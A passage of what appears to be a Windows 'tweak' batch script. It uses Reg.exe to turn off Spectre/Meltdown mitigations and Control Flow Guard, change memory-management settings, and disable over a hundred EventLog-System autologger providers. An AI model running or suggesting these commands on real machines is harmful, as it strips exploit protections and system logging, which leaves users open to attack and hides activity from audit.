Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f > nul 2>&1 
Reg.exe add "HKLM\System\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f > nul 2>&1 
Reg.exe add "HKLM\System\ControlSet002\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "512" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f > nul 2>&1

echo disable autologgers
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{01979c6a-42fa-414c-b8aa-eee2c8202018}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{04268430-d489-424d-b914-0cff741d6684}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{059f0f37-910e-4ff0-a7ee-ae8d49dd319b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{05f02597-fe85-4e67-8542-69567ab8fd4f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{06edcfeb-0fd0-4e53-acca-a6f8bbf81bcb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0b886108-1899-4d3a-9c0d-42d8fc4b9108}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0b9fdccc-451c-449c-9bd8-6756fcc6091a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0bf2fb94-7b60-4b4d-9766-e82f658df540}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0c478c5b-0351-41b1-8c58-4a6737da32e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0d4fdc09-8c27-494a-bda0-505e4fd8adae}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0f67e49f-fe51-4e9f-b490-6f2948cc6027}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{0fa2ee03-1feb-5057-3bb3-eb25521b8482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{11c5d8ad-756a-42c2-8087-eb1b4a72a846}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{125f2cf1-2768-4d33-976e-527137d080f8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{15a7a4f8-0072-4eab-abad-f98a4d666aed}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{15ca44ff-4d7a-4baa-bba5-0998955e531e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{199fe037-2b82-40a9-82ac-e1d46c792b99}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1b562e86-b7aa-4131-badc-b6f3a001407e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1b6b0772-251b-4d42-917d-faca166bc059}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1db28f2e-8f80-4027-8c5a-a11f7f10f62d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1e9a4978-78c2-441e-8858-75b5d1326bc5}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{1f678132-5938-4686-9fdc-c8ff68f15c85}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{206f6dea-d3c5-4d10-bc72-989f03c8b84b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{21b7c16e-c5af-4a69-a74a-7245481c1b97}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2a274310-42d5-4019-b816-e4b8c7abe95c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2e35aaeb-857f-4beb-a418-2e6c0e54d988}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2e6cb42e-161d-413b-a6c1-84ca4c1e5890}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2f07e2ee-15db-40f1-90ef-9d7ba282188a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{2ff3e6b7-cb90-4700-9621-443f389734ed}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{306c4e0b-e148-543d-315b-c618eb93157c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{30e1d284-5d88-459c-83fd-6345b39b19ec}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{331c3b3a-2005-44c2-ac5e-77220c37d6b4}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{355c44fe-0c8e-4bf8-be28-8bc7b5a42720}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3629dd4d-d6f1-4302-a623-0768b51501c7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{36c23e18-0e66-11d9-bbeb-505054503030}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3903d5b9-988d-4c31-9ccd-4022f96703f0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3cb2a168-fe19-4a4e-bdad-dcf422f13473}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3e59a529-b0b3-4a11-8129-9ffe6bb46eb9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3f471139-acb7-4a01-b7a7-ff5da4ba2d43}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{3ff37a1c-a68d-4d6e-8c9b-f79e8b16c482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{40783728-8921-45d0-b231-919037b4b4fd}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{43e63da5-41d1-4fbf-aded-1bbed98fdd1d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{45eec9e5-4a1b-5446-7ad8-a4ab1313c437}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{46c78e5c-a213-46a8-8a6b-622f6916201d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{47bc9477-a8ba-452e-b951-4f2ed3593cf9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{47bfa2b7-bd54-4fac-b70b-29021084ca8f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{494e7a3d-8db9-4ec4-b43e-2844af6e38d6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4af188ac-e9c4-4c11-b07b-1fabc07dfeb2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4cb314df-c11f-47d7-9c04-65fb0051561b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4cec9c95-a65f-4591-b5c4-30100e51d870}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4ee76bd8-3cf4-44a0-a0ac-3937643e37a3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{52fc89f8-995e-434c-a91e-199986449890}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{530fb9b9-c515-4472-9313-fb346f9255e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{538cbbad-4877-4eb2-b26e-7caee8f0f8cb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{54cb22ff-26b4-4393-a8c2-6b0715912c5f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{555908d1-a6d7-4695-8e1e-26931d2012f4}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{55ab77f6-fa04-43ef-af45-688fbf500482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{595f7f52-c90a-4026-a125-8eb5e083f15e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5d674230-ca9f-11da-a94d-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5d896912-022d-40aa-a3a8-4fa5515c76d7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5f92bc59-248f-4111-86a9-e393e12c6139}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{62de9e48-90c6-4755-8813-6a7d655b0802}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{632f767e-0ec3-47b9-ba1c-a0e62a74728a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{63d1e632-95cc-4443-9312-af927761d52a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{64ef2b1c-4ae1-4e64-8599-1636e441ec88}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{651df93b-5053-4d1e-94c5-f6e6d25908d0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{66a5c15c-4f8e-4044-bf6e-71d896038977}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{67fe2216-727a-40cb-94b2-c02211edb34a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6a1f2b00-6a90-4c38-95a5-5cab3b056778}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6b93bf66-a922-4c11-a617-cf60d95c133d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6bba3851-2c7e-4dea-8f54-31e5afd029e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7237fff9-a08a-4804-9c79-4a8704b70b87}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{72cd9ff7-4af8-4b89-aede-5f26fda13567}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{73a33ab2-1966-4999-8add-868c41415269}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{73e9c9de-a148-41f7-b1db-4da051fdc327}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{74c2135f-cc76-45c3-879a-ef3bb1eeaf86}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{75ebc33e-997f-49cf-b49f-ecc50184b75d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7725b5f9-1f2e-4e21-baeb-b2af4690bc87}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7b563579-53c8-44e7-8236-0f87b9fe6594}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7b6bc78c-898b-4170-bbf8-1a469ea43fc5}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7d5387b0-cbe0-11da-a94d-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7da4fe0e-fd42-4708-9aa5-89b77a224885}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{85a62a0d-7e17-485f-9d4f-749a287193a6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89203471-d554-47d4-bde4-7552ec219999}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89592015-d996-4636-8f61-066b5d4dd739}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89fe8f40-cdce-464e-8217-15ef97d4c7c3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{8c416c79-d49b-4f01-a467-e56d3aa8234c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{8e6a5303-a4ce-498f-afdb-e03a8a82b077}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{945a8954-c147-4acd-923f-40c45405a658}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{951b41ea-c830-44dc-a671-e2c9958809b8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{95353826-4fbe-41d4-9c42-f521c6e86360}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9580d7dd-0379-4658-9870-d5be7d52d6de}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{96f4a050-7e31-453c-88be-9634f4e02139}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9741fd4e-3757-479f-a3c6-fc49f6d5edd0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{988c59c5-0a1c-45b6-a555-0c62276e327d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{991f8fe6-249d-44d6-b93d-5a3060c1dedb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9988748e-c2e8-4054-85f6-0c3e1cad2470}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9c205a39-1250-487d-abd7-e831c6290539}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9f650c63-9409-453c-a652-83d7185a2e83}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9f7b5df4-b902-48bc-bc94-95068c6c7d26}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a0e3d8ea-c34f-4419-a1db-90435b8b21d0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a4445c76-ed85-c8a3-02c1-532a38614a9e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a67075c2-3e39-4109-b6cd-6d750058a731}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a6ad76e3-867a-4635-91b3-4904ba6374d7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a7f2235f-be51-51ed-decf-f4498812a9a2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a8a1f2f6-a13a-45e9-b1fe-3419569e5ef2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aa3aa23b-bb6d-425a-b58c-1d7e37f5d02a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{abf1f586-2e50-4ba8-928d-49044e6f0db7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ac43300d-5fcc-4800-8e99-1bd3f85f0320}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ac52ad17-cc01-4f85-8df5-4dce4333c99b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ad5162d8-daf0-4a25-88a7-01cbeb33902e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ae4bd3be-f36f-45b6-8d21-bdd6fb832853}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aea1b4fa-97d1-45f2-a64c-4d69fffd92c9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aec5c129-7c10-407d-be97-91a042c61aaa}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b0aa8734-56f7-41cc-b2f4-de228e98b946}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b2fcd41f-9a40-4150-8c92-b224b7d8c8aa}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b675ec37-bdb6-4648-bc92-f3fdc74d3ca2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b977cf02-76f6-df84-cc1a-6a4b232322b6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b99317e5-89b7-4c0d-abd1-6e705f7912dc}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ba093605-3909-4345-990b-26b746adee0a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ba2ffb5c-e20a-4fb9-91b4-45f61b4b66a0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{babda89a-4d5e-48eb-af3d-e0e8410207c0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{bc0669e1-a10d-4a78-834e-1ca3c806c93b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c02afc2b-e24e-4449-ad76-bcc2c2575ead}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c03715ce-ea6f-5b67-4449-da1d1e1afeb8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
